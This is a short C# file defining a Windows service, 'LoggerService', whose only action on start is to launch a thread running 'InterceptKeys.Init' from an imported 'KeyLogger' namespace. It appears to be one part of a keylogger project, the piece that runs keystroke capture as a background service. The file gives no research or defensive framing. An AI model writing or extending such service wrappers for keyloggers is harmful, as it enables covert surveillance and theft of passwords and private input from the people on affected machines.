using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using KeyLogger;


namespace LoggerService
{
    public partial class Service1 : ServiceBase
    {
        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            Thread t = new Thread(new ThreadStart(InterceptKeys.Init));
            t.Start();
        }

        protected override void OnStop()
        {
        }
    }
}
